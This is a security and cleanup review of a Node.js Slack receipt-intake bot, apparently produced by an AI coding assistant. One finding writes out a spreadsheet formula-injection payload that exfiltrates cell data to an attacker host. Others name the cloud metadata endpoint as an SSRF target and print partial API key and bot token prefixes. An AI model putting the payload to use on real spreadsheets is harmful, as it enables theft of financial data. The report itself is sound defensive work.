# Codebase Review — Rambo Finance Bot

> Two-pass review. Pass 1 (cleanup) is complete before Pass 2 (security) begins.
> **No changes have been made to any source file.** All findings listed only.

---

## Pass 1 — Code Cleanup & Deduplication

### P1-1 · Duplicate Slack API POST wrappers
**Files:** `src/rambo/chase.js:228-245` · `src/slackIntake.js:18-30` (the helper module)

`sendSlackMessage` in chase.js and `slackPost` in src/slackIntake.js both make an identical native-fetch POST to `https://slack.com/api/<method>`. The only structural difference is that `sendSlackMessage` hard-codes `chat.postMessage` while `slackPost` is generic. chase.js never imports from src/slackIntake.js, so neither knows the other exists.

**Suggested fix:** Have chase.js import and call `slackPost` from src/slackIntake.js (or a shared `src/slack.js` utility). Remove `sendSlackMessage`.
**Risk flag:** `sendChaseNudges` is tested in isolation; touching chase.js requires updating that test if the import signature changes.

---

### P1-2 · Triplicated Google Sheets singleton getter
**Files:** `src/sheets.js:13-16` · `src/rambo/ledger.js:23-26` · `src/rambo/chaseState.js:25-28`

All three files contain byte-for-byte identical:
```js
let _sheets = null;
function getSheets() {
  if (!_sheets) _sheets = google.sheets({ version: "v4", auth: getGoogleAuth() });
  return _sheets;
}
```
The ledger.js comment explicitly notes this is intentional ("three lines, fails the only-refactor-if-risk-free bar"), but three divergent copies are a future maintenance trap.

**Suggested fix:** Export `getSheets()` from `src/googleAuth.js` (or a new `src/googleClient.js`) so all three import it. The "touching live code path" objection dissolves once the helper lives in a shared module that isn't the Master DB module.
**Risk flag:** Low — the pattern is self-contained and the fix is purely additive.

---

### P1-3 · Triplicated promise-queue pattern (three different styles)
**Files:** `src/sheets.js:41-90` · `src/rambo/ledger.js:82-100` · `src/rambo/chaseState.js:80-91`

All three serialise Sheet writes through a queue. chaseState.js extracts the cleanest form via an `enqueue(fn)` helper; the other two repeat the `task.then(() => {}, e => console.error(...))` pattern inline at every call site.

**Suggested fix:** Adopt chaseState.js's `enqueue` pattern in the other two modules. No shared module needed — just collapse the repeated inline boilerplate into a local `enqueue`.
**Risk flag:** None — purely internal to each module.

---

### P1-4 · Identical `parseBool` / `parseConfirmed` functions
**Files:** `src/rambo/ledger.js:31-33` · `src/rambo/chaseState.js:33-35`

Both are `/^true$/i.test(String(v ?? "").trim())` with different names.

**Suggested fix:** Export `parseBool` from one module; the other imports it. Or move to a shared `src/rambo/utils.js`.
**Risk flag:** None.

---

### P1-5 · `normalizeMerchant` duplicated as a private `norm` in resolver.js
**Files:** `src/rambo/matcher.js:49-51` (exported) · `src/rambo/resolver.js:48` (private const)

```js
// matcher.js — exported
export function normalizeMerchant(s) {
  return String(s ?? "").toLowerCase().trim().replace(/\s+/g, " ");
}

// resolver.js — private, not imported from matcher
const norm = (v) => String(v ?? "").toLowerCase().trim().replace(/\s+/g, " ");
```

They are identical. resolver.js already imports from matcher.js (transitively via rambo.js), so there's no impedance mismatch.

**Suggested fix:** In resolver.js, `import { normalizeMerchant as norm } from "./matcher.js"` and remove the inline definition.
**Risk flag:** None.

---

### P1-6 · Three separate MIME-type sets for the same concept
**Files:** `index.js:29` · `slackIntake.js:50-56` · `src/claude.js:11-16`

```js
// index.js
const IMAGE_MIME_TYPES = new Set(["image/jpeg", "image/png", "image/gif", "image/webp"]);

// slackIntake.js
const SUPPORTED_MIME_TYPES = new Set(["application/pdf", "image/jpeg", ...]);

// src/claude.js
const IMAGE_MEDIA_TYPES = new Set(["image/jpeg", "image/png", "image/gif", "image/webp"]);
```

Adding a new supported format (e.g. `image/heic`) requires updating three files.

**Suggested fix:** Export `SUPPORTED_IMAGE_TYPES` and `SUPPORTED_MIME_TYPES` from `src/claude.js` (the source of truth for what Claude can process). index.js and slackIntake.js import rather than redeclare.
**Risk flag:** Low.

---

### P1-7 · `MASTER_DB_RANGE` in rambo.js stops at column O — misses column P
**File:** `rambo.js:64`

```js
const MASTER_DB_RANGE = "'Master DB'!A2:O";
```

Column P (`document_type`) was added after this line was written. Rambo reads 15 columns and the 16th is always `undefined` for every Master DB row it processes. matcher.js `MASTER_COL` doesn't reference column P, so no crash — but it means Rambo can never see `document_type` for future matching logic.

**Suggested fix:** Change to `A2:P`. Also update the comment on the same line which says "A–O".
**Risk flag:** Safe — expanding the read range never breaks anything.

---

### P1-8 · `MASTER_COL.matchedAmexTxn` is a stale name
**File:** `src/rambo/matcher.js:33`

```js
matchedAmexTxn: 14,  // column was renamed "Matched CC txn"
```

The column in the sheet (and in sheets.js comments) was renamed from "Matched Amex txn" to "Matched CC txn" when multi-card support was added. The key name is a misleading relic.

**Suggested fix:** Rename to `matchedCcTxn`.
**Risk flag:** None — only used inside matcher.js; no external reference to this key.

---

### P1-9 · Stale "rachel" reference in src/slackIntake.js
**File:** `src/slackIntake.js:5`

```js
// Uses native fetch (same pattern as rachel's sendSlackMessage — no SDK dependency).
```

"Rachel" was fully renamed to "Rambo" in the codebase. Should read "rambo's" or just remove the attribution.

**Suggested fix:** Update the comment.
**Risk flag:** None.

---

### P1-10 · `writeReceiptToSheet` uses a fragile object-spread to rename `paid_by`
**File:** `slackIntake.js:388-412`

```js
parsed: {
  is_receipt: true,
  document_type: "receipt",
  suggested_paid_by: parsed.paid_by,   // ← must come BEFORE the spread
  ...parsed,                            // ← spread includes `paid_by` (not `suggested_paid_by`)
}
```

`buildReceiptRow` reads `parsed.suggested_paid_by`. The spread adds `paid_by` (harmless), and `suggested_paid_by` is set correctly because the named property appears before the spread. This works today but is order-sensitive and non-obvious. If the spread is ever moved above the named property, `suggested_paid_by` silently disappears.

**Suggested fix:** Build the object explicitly without relying on spread order; or add `suggested_paid_by` to the confirmation-view's `parsed` object so no renaming is needed downstream.
**Risk flag:** Low; the current behaviour is correct.

---

### P1-11 · `appendErrorRow` called from Slack intake without `messageId`/`subject`
**File:** `slackIntake.js` (root), `handleIncomingMessage` and the earlier poll cycle

```js
appendErrorRow(SHEETS_ID, {
  service: "slack-intake",
  sender: userName,
  attachment: file.name,
  error: e.message,
  // messageId and subject always undefined → empty cells in the Error Log
});
```

The Error Log sheet has columns for "Message ID" and "Subject" that are always blank for Slack intake errors. This isn't wrong but creates a misleading gap in the sheet schema.

**Suggested fix:** Either add `messageId: msg.ts, subject: "(Slack file)"` to these calls, or split `appendErrorRow` into a per-source variant.
**Risk flag:** None.

---

### P1-12 · Gmail listing is N+1 API calls
**File:** `src/gmail.js:63-80`

`listUnprocessedMessages` fetches up to 50 message summaries from `messages.list`, then issues one individual `messages.get` per message to check whether it carries the processed label. `messages.list` already returns `labelIds` in the summary when `format` is not specified — the per-message GET is unnecessary.

**Suggested fix:** Use `labelIds` from the list result directly; skip the per-message GET. This reduces 50 API calls per cycle to zero extra calls when nothing is new.
**Risk flag:** Low; requires verifying the `labelIds` field is present in list results (it is, per Gmail API docs).

---

### P1-13 · Leftover debug `console.log` statements from "3c76688" commit
**File:** `slackIntake.js:204-205`, `:284`, `:236`

```js
console.log(`Slack request received: ${req.method} ${req.url} (${rawBody.length} bytes)`);
console.log(`Slack payload type: ${payload.type}, action: ...`);
console.log(`views.open result: ok=${result.ok}`);
```

These were added as debug diagnostics when the button click was producing no response. They log every interaction (including every "Paid By" dropdown change that triggers a `views.update`). In production this is noisy and creates a log line for every user interaction.

**Suggested fix:** Remove the per-request and per-action logs; keep the per-file `console.log("Posted receipt prompt for...")` which is the meaningful audit event.
**Risk flag:** None.

---

## Pass 2 — Security Review

### Legend
| Severity | Count |
|---|---|
| Critical | 3 |
| High | 4 |
| Medium | 5 |
| Low | 4 |

---

### [CRITICAL] S2-C1 · Live credentials in `.env` on disk
**File:** `.env` (repo root)
**CWE:** CWE-798 — Use of Hard-coded Credentials

The `.env` file on disk contains **real, production-active** credentials:
- `ANTHROPIC_API_KEY=sk-ant-api03-kV2Ip...` (full key)
- `SLACK_BOT_TOKEN=xoxb-5261384529442-...` (full token)

`.gitignore` correctly excludes `.env` from version control (good), but these are not placeholder values — they are live keys. Anyone with filesystem or session access to the developer machine can read them. They have also been read in the current Claude Code session.

**Impact:** Immediate credential compromise. The Anthropic key can be used to bill arbitrary Claude API usage. The Slack token gives the full permissions of the bot (read channel history, post messages, DM any workspace member the bot maps to, open modals).

**Remediation:**
1. **Rotate both credentials now** — the Anthropic key and Slack bot token should be revoked and reissued.
2. Use placeholder values (`sk-ant-your-key`) in `.env.example` as already done.
3. Consider using a secrets manager (Railway's encrypted env vars, 1Password Secrets Automation) rather than a local `.env` file for development.
4. Add a pre-commit hook (`git-secrets`, `trufflehog`) to block credential commits.

---

### [CRITICAL] S2-C2 · Slack signing secret verification silently disabled when env var is absent
**File:** `slackIntake.js:72-83`
**CWE:** CWE-290 — Authentication Bypass by Spoofing | OWASP A07 — Identification and Authentication Failures

```js
function verifySlackRequest(rawBody, timestamp, signature) {
  if (!SIGNING_SECRET) return true;  // ← silent bypass
  ...
}
```

`SLACK_SIGNING_SECRET` is also missing from the `REQUIRED_ENV` array (lines 30-36), so the process starts successfully without it. Any unauthenticated POST to `/slack/interactions` or `/slack/events` is accepted, processed, and acted upon — including writing receipt rows to the finance spreadsheet.

**Impact:** An attacker who discovers the Railway URL (not secret — it's in the Slack app settings) can forge arbitrary Slack interaction payloads: submit fabricated receipts to the Master DB, trigger modal opens against real users, or flood the events endpoint.

**Remediation:**
1. Add `"SLACK_SIGNING_SECRET"` to `REQUIRED_ENV` in slackIntake.js — the process should refuse to start without it.
2. Remove the `if (!SIGNING_SECRET) return true` shortcut.

---

### [CRITICAL] S2-C3 · Domain-wide delegation uses a single auth for all APIs — impersonation leaks into Drive and Sheets
**File:** `src/googleAuth.js`
**CWE:** CWE-272 — Least Privilege Violation | OWASP A01 — Broken Access Control

```js
const SCOPES = [
  "https://www.googleapis.com/auth/spreadsheets",
  "https://www.googleapis.com/auth/drive",           // ← full Drive, not drive.file
  "https://www.googleapis.com/auth/gmail.modify",
];

// ONE singleton auth with ALL scopes AND optional impersonation
const options = { credentials, scopes: SCOPES };
if (impersonateUser) {
  options.clientOptions = { subject: impersonateUser };  // impersonates THIS user for ALL APIs
}
_auth = new google.auth.GoogleAuth(options);
```

Two compounding issues:

**a) Drive scope is too broad.** `https://www.googleapis.com/auth/drive` grants full read/write access to every file in the domain when used with domain-wide delegation. The app only needs to *create* files (receipts). `https://www.googleapis.com/auth/drive.file` restricts the service account to files it created — which is all this app needs.

**b) Impersonation bleeds into Sheets and Drive.** When `GMAIL_IMPERSONATE_USER=finance@truvid.com` is set, the single auth object impersonates that user for ALL three APIs. Drive and Sheets calls run *as that user*, not as the service account's own identity. This works only because that user has been granted access to the spreadsheet and Drive folder — but it means the service account is effectively that user for all finance-data operations. If that user's account is suspended or has permissions changed, all three services break simultaneously. More critically, with `drive` scope and impersonation, the service account can read *all* of that user's personal Drive files, not just the receipt folder.

**Impact:** If the service account JSON is ever compromised, an attacker inherits full Drive access for any impersonatable domain user, not just the finance@ inbox.

**Remediation:**
1. Change `drive` scope to `drive.file`.
2. Create **two** auth instances: one with `gmail.modify` + `subject` for Gmail; one without `subject` for Sheets and Drive (the service account's own identity, granted direct access to the specific spreadsheet and folder).
3. Export both from `googleAuth.js`: `getGmailAuth()` and `getServiceAccountAuth()`.

---

### [HIGH] S2-H1 · No authorization check on receipt submission
**File:** `slackIntake.js` (root), `handleIncomingMessage` and `writeReceiptToSheet`
**CWE:** CWE-285 — Improper Authorization | OWASP A01 — Broken Access Control

Any Slack user who can upload a file to the intake channel triggers the bot. Any Slack user who can click the "Fill in details" button submits a receipt to the finance spreadsheet. There is no check that the submitter:
- Is a company employee (vs. a guest account or external collaborator)
- Has permission to log expenses
- Is submitting on their own behalf (vs. forging a submission attributed to someone else)

`meta.userId` is stored and passed to the sheet via `userName`, but is never validated against an allowlist.

**Impact:** A guest user, departing employee, or external collaborator with access to the channel can insert arbitrary expense records into the Master DB. An attacker can create phantom receipts that get approved and paid.

**Remediation:**
1. Maintain a list of authorized submitter Slack IDs (or check that the user is a full workspace member via `users.info` — guests have `is_restricted: true` or `is_ultra_restricted: true`).
2. Reject `view_submission` payloads from users not in the authorized set, returning a Slack error modal rather than writing to the sheet.
3. Consider adding a "pending review" status rather than immediately writing all Slack-submitted receipts to "Pending" in the sheet.

---

### [HIGH] S2-H2 · No file size check before downloading Slack files
**File:** `slackIntake.js` (root), `handleIncomingMessage` → `processSlackFile`
**CWE:** CWE-400 — Uncontrolled Resource Consumption

```js
// No size check — entire file downloaded into memory as base64
const base64Data = await downloadSlackFile(SLACK_TOKEN, file.url_private);
```

Slack allows files up to 1 GB on paid plans. The file is loaded entirely into memory as a base64 string (33% size overhead), then sent verbatim to Claude's API. A 100 MB file becomes a ~133 MB string in the Claude API request body.

**Impact:** OOM crash of the Node process (taking down all three services in the `& wait` start command), excessive Claude API costs from large prompts.

**Remediation:**
```js
const MAX_FILE_BYTES = 10 * 1024 * 1024; // 10 MB — receipts should never be larger
if (file.size && file.size > MAX_FILE_BYTES) {
  console.warn(`Skipping "${file.name}": ${file.size} bytes exceeds limit`);
  return;
}
```

---

### [HIGH] S2-H3 · `file.url_private` fetched without domain validation (SSRF vector)
**File:** `src/slackIntake.js:46-53`
**CWE:** CWE-918 — Server-Side Request Forgery | OWASP A10 — Server-Side Request Forgery

```js
export async function downloadSlackFile(token, url) {
  const res = await fetch(url, { headers: { Authorization: `Bearer ${token}` } });
  ...
}
```

`url` comes from `file.url_private` in a Slack event payload. The value is not validated to be a `https://files.slack.com/` URL. If signing verification is disabled (S2-C2), a crafted event can set `url_private` to any URL — including Railway's internal metadata service (`http://169.254.169.254/`) or other internal endpoints.

**Impact:** SSRF to internal Railway infrastructure, leaking instance metadata (and potentially Railway API tokens), or probing internal services.

**Remediation:**
```js
if (!url.startsWith("https://files.slack.com/")) {
  throw new Error(`Refusing to fetch non-Slack URL: ${url}`);
}
```

---

### [HIGH] S2-H4 · `drive` scope is domain-wide — all users' files accessible
*(Detailed under S2-C3 — flagged separately here for severity weighting.)*

Even with the SSRF and signing issues resolved, the combination of:
- Service account with domain-wide delegation
- `https://www.googleapis.com/auth/drive` scope (not `drive.file`)
- Impersonation of any user via `subject`

means the service account can read and write ANY Google Drive file owned by ANY user in the `truvid.com` domain. This is a high-blast-radius standing capability that exists independent of any vulnerability — it's a misconfiguration.

**Remediation:** Scope to `drive.file`. See S2-C3 for full details.

---

### [MEDIUM] S2-M1 · `private_metadata` not bounded — exceeding 3000 chars corrupts confirmation
**File:** `slackIntake.js` (root), `buildConfirmView` and the `view_submission` handler for `receipt_form`
**CWE:** CWE-20 — Improper Input Validation

Slack's `private_metadata` field has a hard 3000-character limit. The JSON serialization of `{ parsed, meta }` is not checked before being set. `meta.invoiceLink` (a Google Drive `webViewLink`) can be ~120 chars. `parsed.notes` is only truncated to 150 chars during the *initial Claude extraction* — not during the form submission path where the user types directly.

If the JSON exceeds 3000 chars, Slack silently truncates it. The `receipt_confirm` handler then calls `JSON.parse(payload.view.private_metadata)`, which throws, and the confirmation write fails silently.

**Remediation:** Truncate `parsed.notes` (and any long field) before building the confirmation view's `private_metadata`. Or add a post-serialisation check:
```js
const metaJson = JSON.stringify({ parsed, meta });
if (metaJson.length > 2900) { /* truncate notes further */ }
```

---

### [MEDIUM] S2-M2 · Spreadsheet formula injection via AI-extracted values
**File:** `src/sheets.js:73-90`, `index.js:91`
**CWE:** CWE-74 — Improper Neutralization of Special Elements in Output | OWASP A03 — Injection

The app writes AI-extracted values to Google Sheets with `valueInputOption: "RAW"`. The Sheets API documentation specifies that `RAW` does **not** evaluate formulas — values are stored as literals. However, when a user subsequently opens the sheet in a browser, Google Sheets' client-side rendering will evaluate any cell value beginning with `=` as a formula.

An adversary could craft a receipt (or a receipt filename) containing a `provider` value like `=IMPORTDATA("https://attacker.com/"&A1)` to exfiltrate sheet contents when anyone views the sheet.

**Impact:** Data exfiltration from the finance spreadsheet via formula injection when a user opens the sheet. This is sometimes called "CSV injection" or "formula injection."

**Remediation:** Prefix cell values starting with `=`, `+`, `-`, or `@` with a single quote (`'`) before writing — this forces Sheets to treat the value as a plain string at display time. Apply this sanitization in `buildReceiptRow`.

---

### [MEDIUM] S2-M3 · Financial amounts and provider names logged to stdout in every cycle
**File:** `index.js:93` · `slackIntake.js:337`, `:437`
**CWE:** CWE-532 — Insertion of Sensitive Information into Log File

```js
console.log(`Added row: ${parsed.provider} · ${parsed.amount} ${parsed.currency} ...`);
console.log(`Receipt submitted: ${parsed.provider} · ${parsed.amount} ${parsed.currency} ...`);
console.log(`Posted receipt prompt for "${file.name}" from ${userName}`);
```

Railway collects and stores stdout. Logs contain provider names, amounts, currencies, and employee names. While this is audit-level data (appropriate), financial amounts and recipient names in unstructured plaintext logs are a data minimization concern, particularly if Railway logs are shared with third parties or if a support ticket exposes log contents.

**Remediation:** Consider structured logging (JSON lines) so log levels and sensitive fields can be filtered at the aggregator. At minimum, document that Railway logs contain PII (names) and financial data.

---

### [MEDIUM] S2-M4 · Service account JSON is the single high-value secret with no rotation path
**File:** `src/googleAuth.js`
**CWE:** CWE-321 — Use of Hard-Coded Cryptographic Key (by analogy)

The service account JSON key is a long-lived credential with domain-wide delegation. There is no key rotation, no short-lived token mechanism, and no audit of when/how it was last rotated. If the Railway environment is ever compromised or the key is accidentally logged, it cannot be selectively revoked (only the whole service account can be disabled, which takes down the entire service).

**Impact:** Persistent access to all Google Workspace APIs the account is delegated for, indefinitely, until manually noticed and revoked.

**Remediation:**
1. Rotate the service account key on a schedule (quarterly or annually).
2. Enable Google Cloud audit logging for the service account to detect unexpected API calls.
3. Consider Workload Identity Federation as a path away from long-lived JSON keys entirely (Railway supports OIDC identity tokens).

---

### [MEDIUM] S2-M5 · No rate limiting on the HTTP endpoint
**File:** `slackIntake.js` (root), HTTP server
**CWE:** CWE-770 — Allocation of Resources Without Limits

The HTTP server accepts unlimited concurrent connections. Slack's own signature verification provides some protection, but:
1. If signing is bypassed (S2-C2), the endpoint accepts unlimited unauthenticated requests.
2. A valid attacker inside the Slack workspace can trigger many concurrent button clicks and modal submissions.
3. The Events API (`/slack/events`) will receive every message posted to the channel — high-traffic channels could overload the server.

**Remediation:** Add a simple per-IP or global request rate limiter. Railway itself may provide some DDoS mitigation, but application-level rate limiting should not depend on infrastructure.

---

### [LOW] S2-L1 · `e.stack` logged for all interaction handler errors
**File:** `slackIntake.js:374`

```js
console.error("Interaction handler error:", e.message, e.stack);
```

Full stack traces in Railway logs reveal file paths, line numbers, and code structure. While this is acceptable for an internal app, it would be sensitive if logs were ever shipped to a less-trusted aggregator.

**Remediation:** Log `e.message` at error level; log `e.stack` at debug level only (guarded by an env var like `LOG_LEVEL=debug`).

---

### [LOW] S2-L2 · Slack intake cursor not validated before use
**File:** `src/sheets.js:99-105`, `slackIntake.js:552-563`

The cursor (a Slack message timestamp string) is read from the "Slack Intake State" Google Sheet and passed as `oldest` to `conversations.history`. No validation that it's a plausible Slack timestamp before use. A corrupted or manually edited cell (e.g. blank, or a non-numeric string) would be passed to the Slack API. Slack would return an error, but this would log a confusing error message rather than a clear validation failure.

**Remediation:** Validate `cursor` matches `/^\d{10}\.\d{6}$/` before using; fall back to 24h ago on mismatch with a warning.

---

### [LOW] S2-L3 · Rambo's `MASTER_DB_RANGE` stops at column O — `document_type` invisible to matcher
**File:** `rambo.js:64` *(also listed as P1-7 for cleanup)*

```js
const MASTER_DB_RANGE = "'Master DB'!A2:O";
```

This is both a cleanup issue and a mild data integrity concern: Rambo performs matching decisions based on an incomplete view of each receipt row. Currently `document_type` is not used by the matcher, so there is no impact — but if a future matching rule needs "is this a receipt or an invoice?" the column will silently be `undefined`.

**Remediation:** Extend to `A2:P` and update MASTER_COL if needed.

---

### [LOW] S2-L4 · `appendLedgerEntry` is imported but never called in the running codebase
**Files:** `src/rambo/ledger.js` — exports `appendLedgerEntry` and `buildLedgerRow`; `rambo.js` — does not import them

The ledger write path is defined but not yet wired (the design doc describes it as a future follow-up once the confirmation flow is built). Dead exports are not a security risk but are a maintenance concern — they receive no testing in the current live path.

**Remediation:** Document with a TODO comment that this function is pending the Stage 2 confirmation wire-up, or remove it and re-add when the flow exists.

---

## Summary

### Issue counts by category

| Category | Critical | High | Medium | Low |
|---|---|---|---|---|
| Secrets / credential management | 1 | — | 1 | — |
| Authentication & signing | 1 | — | — | — |
| Authorization (who can do what) | — | 1 | — | — |
| Google auth / scopes / impersonation | 1 | 1 | — | — |
| Input validation / injection | — | 2 | 2 | 1 |
| Resource limits | — | 1 | 1 | — |
| Data / log hygiene | — | — | 1 | 2 |
| Dead/stale code paths | — | — | — | 1 |
| **Total** | **3** | **5** | **5** | **4** |

---

### Top 3 to fix first

**#1 — S2-C1: Rotate the Anthropic API key and Slack bot token immediately.**
These are live credentials that have been read in this session. Action required before anything else: revoke and reissue both. The `.gitignore` is correctly set up but using placeholder values in the actual `.env` file (matching `.env.example`) is the right hygiene going forward.

**#2 — S2-C2: Add `SLACK_SIGNING_SECRET` to `REQUIRED_ENV` and remove the bypass.**
Until this is fixed, the entire HTTP endpoint is unauthenticated. Any POST to the Railway URL can inject arbitrary records into the Master DB or trigger arbitrary file downloads. This is the highest-impact immediately-exploitable issue.

**#3 — S2-C3 / S2-H4: Split the Google auth singleton and restrict Drive scope to `drive.file`.**
The current setup gives the service account (with domain-wide delegation) write access to every employee's Google Drive. This is the highest-blast-radius standing misconfiguration. Splitting into a Gmail-specific auth and a Sheets/Drive auth also removes the implicit impersonation from non-Gmail API calls.
